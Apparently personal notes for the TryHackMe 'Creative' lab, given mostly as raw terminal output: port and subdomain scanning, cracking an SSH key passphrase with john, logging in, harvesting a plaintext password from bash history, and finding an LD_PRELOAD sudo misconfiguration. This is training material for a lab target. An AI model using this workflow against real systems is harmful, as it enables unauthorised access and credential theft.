<code>
https://tryhackme.com/r/room/creative

## Service Enumeration 

└─$ nmap  -sV -Pn  10.10.77.215
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-29 02:44 CDT
Nmap scan report for 10.10.77.215
Host is up (0.037s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds

┌──(duke㉿kali)-[~/Documents/THM_Creative]
└─$ nmap  -A  -Pn  creative.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-29 03:00 CDT
Nmap scan report for creative.thm (10.10.77.215)
Host is up (0.035s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.75 seconds

### subdomain enumeration 
┌──(duke㉿kali)-[~/Documents/THM_Creative]
└─$ ffuf -u http://creative.thm -c -w ../../www/wordlists/Subdomain.txt -H 'Host:FUZZ.cretive.thm' -fs 178

## Found beta.creative.thm

### folder enumeration - nothing
┌──(duke㉿kali)-[~/Documents/THM_Creative]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://creative.thm -x .php, .txt, .html                                    
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
[+] Url:                     http://creative.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,
[+] Timeout:                 10s
/assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]


┌──(duke㉿kali)-[~/Documents/THM_Creative]
└─$ ssh2john id_rsa2 > hash.txt
                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_Creative]
└─$ john  --wordlist=../../rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 0.00% (ETA: 2024-05-03 20:15) 0g/s 41.55p/s 41.55c/s 41.55C/s hockey..camille
sweetness        (id_rsa2)     
1g 0:00:00:23 DONE (2024-04-29 06:09) 0.04293g/s 41.21p/s 41.21c/s 41.21C/s xbox360..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(duke㉿kali)-[~/Documents/THM_Creative]
└─$ ssh -i rsa_id7 saad@creative.thm 
Enter passphrase for key 'rsa_id7': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

### run linpease and found
╔══════════╣ Searching passwords in history files
/home/saad/.bash_history:sudo -l                                                                                    
/home/saad/.bash_history:echo "saad:MyStrongestPasswordYet$4291" > creds.txt
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:sudo -l
/home/saad/.bash_history:mysql -u root -p
/home/saad/.bash_history:mysql -u root
/home/saad/.bash_history:sudo su
/home/saad/.bash_history:ssh root@192.169.155.104
/home/saad/.bash_history:mysql -u user -p
/home/saad/.bash_history:mysql -u db_user -p
/home/saad/.bash_history:ls -ld /var/lib/mysql

## saad:MyStrongestPasswordYet$4291

saad@m4lware:/tmp$ sudo -l
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping


<\code>
